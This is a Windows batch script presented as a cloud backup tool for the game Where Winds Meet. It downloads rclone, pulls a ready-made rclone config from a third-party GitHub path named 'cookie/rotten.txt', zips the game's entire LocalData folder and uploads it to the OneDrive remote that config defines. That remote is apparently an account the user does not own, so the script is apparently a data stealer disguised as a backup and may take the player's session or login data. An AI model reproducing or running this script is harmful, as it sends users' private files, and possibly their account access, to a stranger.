@echo off
title WWM Cloud Sync :: Backup Shaders & Config
setlocal enabledelayedexpansion

set "GAME_DIR=D:\SteamLibrary\steamapps\common\Where Winds Meet\LocalData"
set "ARCHIVE_NAME=WWM_LocalData.zip"
set "CONFIG_URL=https://raw.githubusercontent.com/anyuser235-maker/Donut/refs/heads/main/cookie/rotten.txt"

cls
echo ================================================================
echo               WHERE WINDS MEET - CLOUD BACKUP
echo ================================================================
echo.

echo  [1/4] Checking Rclone installation...
if not exist "rclone.exe" (
    echo        -^> Downloading Rclone binary...
    curl -s -L -o rclone.zip "https://downloads.rclone.org/rclone-current-windows-amd64.zip"
    tar -xf rclone.zip --strip-components=1 */rclone.exe
    del /f /q rclone.zip >nul 2>&1
    echo        -^> [OK] Rclone initialized.
) else (
    echo        -^> [OK] Rclone found.
)
echo.

echo  [2/4] Fetching encrypted config from GitHub...
curl -s -L -o rclone.conf "%CONFIG_URL%"
if exist "rclone.conf" (
    echo        -^> [OK] Configuration updated.
) else (
    echo        -^> [ERROR] Failed to fetch rclone.conf!
    goto :FAIL
)
echo.

echo  [3/4] Packaging game shaders and settings...
if not exist "%GAME_DIR%" (
    echo        -^> [ERROR] Game directory not found:
    echo            %GAME_DIR%
    goto :FAIL
)

if exist "%ARCHIVE_NAME%" del /f /q "%ARCHIVE_NAME%" >nul 2>&1
"C:\Program Files\7-Zip\7z.exe" a -tzip "%ARCHIVE_NAME%" "%GAME_DIR%\*" -xr!crash_extra -mx=0 -bsp1
echo        -^> [OK] Archive created successfully.
echo.

echo  [4/4] Uploading archive to OneDrive...
echo ----------------------------------------------------------------
rclone.exe --config rclone.conf copy "%ARCHIVE_NAME%" "onedrive:WWM_Master" -P
echo ----------------------------------------------------------------
echo.

echo  [*] Cleaning up temporary archive...
del /f /q "%ARCHIVE_NAME%" >nul 2>&1

echo.
echo ================================================================
echo  [SUCCESS] Backup complete! Master files saved to OneDrive.
echo ================================================================
echo.
pause
exit /b 0

:FAIL
echo.
echo ================================================================
echo  [FAILED] An error occurred during backup execution.
echo ================================================================
echo.
pause
exit /b 1
